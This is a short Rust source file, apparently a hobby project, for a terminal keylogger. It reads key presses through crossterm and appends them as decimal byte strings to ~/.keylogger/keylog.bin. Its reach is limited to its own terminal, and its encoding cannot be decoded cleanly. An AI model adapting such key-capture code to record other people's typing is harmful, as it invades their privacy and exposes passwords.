pub use crossterm::{
    event::{Event, KeyCode, KeyModifiers, read},
    terminal::{disable_raw_mode, enable_raw_mode},
};
use std::fmt::Write as FmtWrite;
use std::{
    env,
    fs::{self, OpenOptions},
    io::{self, Write},
    path::PathBuf,
};

fn create_file_dir() -> io::Result<PathBuf> {
    let home_dir = env::var("HOME").expect("Error: directory home not found");
    let mut file_dir = PathBuf::from(home_dir);
    file_dir.push(".keylogger");
    fs::create_dir_all(&file_dir).expect("Error: could not create directory");
    file_dir.push("keylog.bin");
    Ok(file_dir)
}

fn save_buffer_in_file(buffer: &mut String) -> std::io::Result<()> {
    let path = match create_file_dir() {
        Ok(p) => p,
        Err(e) => {
            eprintln!("Error: {e}");
            return Err(e);
        }
    };
    let mut buf_bytes = String::new();
    for byte in buffer.as_bytes() {
        write!(&mut buf_bytes, "{}", byte).unwrap();
    }
    let mut file = match OpenOptions::new()
        .read(true)
        .append(true)
        .create(true)
        .open(path)
    {
        Ok(f) => f,
        Err(e) => {
            eprintln!("Error in open file: {e}");
            return Err(e);
        }
    };
    file.write_all(buf_bytes.as_bytes())?;
    Ok(())
}
pub fn run_aplication() -> std::io::Result<()> {
    let mut buffer = String::new();
    let limit_reset_buffer = 25;

    loop {
        if let Event::Key(event) = read()? {
            if event.modifiers == KeyModifiers::CONTROL && event.code == KeyCode::Char('c') {
                break;
            }
            if let KeyCode::Char(c) = event.code {
                buffer.push(c);
                io::stdout().flush()?;

                if buffer.len() >= limit_reset_buffer {
                    save_buffer_in_file(&mut buffer)?;
                    buffer.clear();
                }
            }
        }
    }
    Ok(())
}
